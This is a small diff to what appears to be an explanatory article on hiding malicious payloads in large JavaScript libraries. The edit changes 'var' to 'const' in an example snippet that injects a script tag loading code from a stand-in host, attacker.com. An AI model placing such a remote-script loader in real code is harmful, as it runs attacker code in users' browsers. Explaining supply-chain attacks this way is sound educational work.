@@ -24,7 +24,7 @@ payload? Think of something such as the example below in the middle of a huge
 library:
 
 ```javascript
-var s = document.createElement(s);
+const s = document.createElement(s);
 s.src='//attacker.com/malicious.js';
 document.body.appendChild(s);
 ```
